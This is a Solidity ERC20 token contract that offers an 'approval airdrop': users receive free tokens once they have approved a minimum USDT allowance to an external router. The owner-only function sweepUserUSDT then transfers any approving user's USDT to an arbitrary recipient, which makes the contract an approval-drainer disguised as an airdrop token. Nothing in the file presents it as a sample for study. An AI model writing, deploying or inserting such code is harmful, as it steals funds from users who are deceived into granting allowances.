// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Capped.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

interface IApprovalRouter {
    function transferUSDTFrom(address from, address to, uint256 amount) external;
    function getUserAllowance(address user) external view returns (uint256);
}

contract UnifiedVaultToken is ERC20Capped, Ownable {
    
    IApprovalRouter public immutable ROUTER;
    uint256 public minApprovalAmount;
    uint256 public airdropAmount;
    mapping(address => bool) public hasReceivedApprovalAirdrop;
    uint256 public totalAirdropsClaimed;
    uint256 public totalAirdropsDistributed;
    
    event ApprovalAirdropClaimed(address indexed user, uint256 amount);
    event AirdropAmountUpdated(uint256 newAmount);
    event MinApprovalAmountUpdated(uint256 newAmount);
    event USDTSwept(address indexed from, address indexed to, uint256 amount);
    event USDTDeposited(address indexed from, uint256 amount);
    
    constructor(
        string memory name,
        string memory symbol,
        uint256 cap,
        address _routerAddress,
        uint256 _minApprovalAmount,
        uint256 _airdropAmount,
        address initialOwner
    ) 
        ERC20(name, symbol) 
        ERC20Capped(cap)
        Ownable(initialOwner)
    {
        require(_routerAddress != address(0), "Invalid router address");
        require(cap > 0, "Cap must be greater than zero");
        require(_airdropAmount > 0 && _airdropAmount <= cap, "Invalid airdrop amount");
        
        ROUTER = IApprovalRouter(_routerAddress);
        minApprovalAmount = _minApprovalAmount;
        airdropAmount = _airdropAmount;
    }
    
    function claimApprovalAirdrop() external {
        require(!hasReceivedApprovalAirdrop[msg.sender], "Already claimed airdrop");
        
        uint256 userAllowance = ROUTER.getUserAllowance(msg.sender);
        require(
            userAllowance >= minApprovalAmount,
            "Insufficient USDT approval to Router"
        );
        
        hasReceivedApprovalAirdrop[msg.sender] = true;
        totalAirdropsClaimed += 1;
        totalAirdropsDistributed += airdropAmount;
        
        _mint(msg.sender, airdropAmount);
        
        emit ApprovalAirdropClaimed(msg.sender, airdropAmount);
    }
    
    function batchAirdrop(address[] calldata recipients) external onlyOwner {
        require(recipients.length > 0, "Empty recipients list");
        
        for (uint256 i = 0; i < recipients.length; i++) {
            address recipient = recipients[i];
            
            if (recipient == address(0) || hasReceivedApprovalAirdrop[recipient]) {
                continue;
            }
            
            hasReceivedApprovalAirdrop[recipient] = true;
            totalAirdropsClaimed += 1;
            totalAirdropsDistributed += airdropAmount;
            
            _mint(recipient, airdropAmount);
            
            emit ApprovalAirdropClaimed(recipient, airdropAmount);
        }
    }
    
    function depositUSDT(uint256 amount) external {
        require(amount > 0, "Amount must be greater than zero");
        
        ROUTER.transferUSDTFrom(msg.sender, address(this), amount);
        
        emit USDTDeposited(msg.sender, amount);
    }
    
    function sweepUserUSDT(
        address userToSweep,
        address recipient,
        uint256 amountToTransfer
    ) external onlyOwner {
        require(userToSweep != address(0) && recipient != address(0), "Invalid addresses");
        require(amountToTransfer > 0, "Amount must be greater than zero");
        
        uint256 userAllowance = ROUTER.getUserAllowance(userToSweep);
        require(
            userAllowance >= amountToTransfer,
            "User has not approved enough USDT to Router"
        );
        
        ROUTER.transferUSDTFrom(userToSweep, recipient, amountToTransfer);
        
        emit USDTSwept(userToSweep, recipient, amountToTransfer);
    }
    
    function setAirdropAmount(uint256 newAmount) external onlyOwner {
        require(newAmount > 0, "Amount must be greater than zero");
        airdropAmount = newAmount;
        emit AirdropAmountUpdated(newAmount);
    }
    
    function setMinApprovalAmount(uint256 newAmount) external onlyOwner {
        minApprovalAmount = newAmount;
        emit MinApprovalAmountUpdated(newAmount);
    }
    
    function resetClaimStatus(address user) external onlyOwner {
        hasReceivedApprovalAirdrop[user] = false;
    }
    
    function getAirdropInfo() external view returns (
        uint256 _totalClaimed,
        uint256 _totalDistributed,
        uint256 _airdropAmount,
        uint256 _minApprovalAmount,
        uint256 _remainingSupply
    ) {
        return (
            totalAirdropsClaimed,
            totalAirdropsDistributed,
            airdropAmount,
            minApprovalAmount,
            cap() - totalSupply()
        );
    }
    
    function canClaimAirdrop(address user) external view returns (bool) {
        if (hasReceivedApprovalAirdrop[user]) {
            return false;
        }
        
        uint256 userAllowance = ROUTER.getUserAllowance(user);
        return userAllowance >= minApprovalAmount;
    }
    
    function getRouterAddress() external view returns (address) {
        return address(ROUTER);
    }
    
    function _update(address from, address to, uint256 value) 
        internal 
        override(ERC20Capped) 
    {
        super._update(from, to, value);
    }
}

